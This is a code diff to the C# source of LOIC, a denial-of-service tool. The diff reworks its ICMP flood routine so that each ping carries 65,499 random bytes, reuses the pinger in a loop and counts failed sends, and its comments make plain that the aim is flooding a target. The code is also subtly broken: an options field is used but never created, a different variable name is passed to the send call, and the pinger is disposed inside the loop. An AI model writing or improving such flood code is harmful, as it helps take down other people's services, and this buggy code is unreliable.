@@ -539,18 +539,23 @@ namespace LOIC
         private Random _random;
         private int _PingsPerThread;
         private byte[] _BytesToSend;
-        private Ping _pingsender;
+        private Ping _pingSender;
+        private PingOptions _opt;
        
 
         /// <summary>
         /// Create the ICMP object, because we need that, for reasons
         /// </summary>
 
-        public ICMP(string ip, int port, int PingsPerThread )
+        public ICMP(string ip, int port, int PingsPerThread)
         {
            this._ip = ip;
            this._port = port;
-           this._PingsPerThread = PingsPerThread; 
+           this._PingsPerThread = PingsPerThread;
+           this._pingSender = new Ping();
+           
+           _opt.DontFragment = false;
+           _opt.Ttl = 128;
            
             //not sure if need to initiliase as bw_work is a nonstatic field anyway
             //_BytesToSend = new byte[65499];
@@ -572,7 +577,7 @@ namespace LOIC
             //fill an array with 65499 random bytes bytes 
             for(int b = 0; b < 65499; b++){
                
-              _BytesToSend[b] = Convert.ToByte(_random.Next(1,50));
+              this._BytesToSend[b] = Convert.ToByte(this._random.Next(0,255));
             }
         
             
@@ -584,10 +589,23 @@ namespace LOIC
 
             for (int i = 0; i < _PingsPerThread; i++)
             {
-                //send the data with a timeout value of 10ms 
-                pingSender.Send(_ip+":"+_port, 1, _BytesToSend, opt);
-                //dispose of the pingSender because why do WE need to see the replies ;)
-                pingSender.Dispose();
+                try
+                {
+
+                    //send the data with a timeout value of 10ms 
+                    _pingSender.Send(_ip + ":" + _port, 1, _BytesToSend, opt);
+                    Requested++;
+                }
+                catch (PingException)
+                {
+                    //if not working for whatever reason this will show this.
+                    Requested--;
+                    Failed++;
+                }
+                    //dispose of the pingSender because why do WE need to see the replies ;)
+                
+                _pingSender.Dispose();
+               
             }
 
            
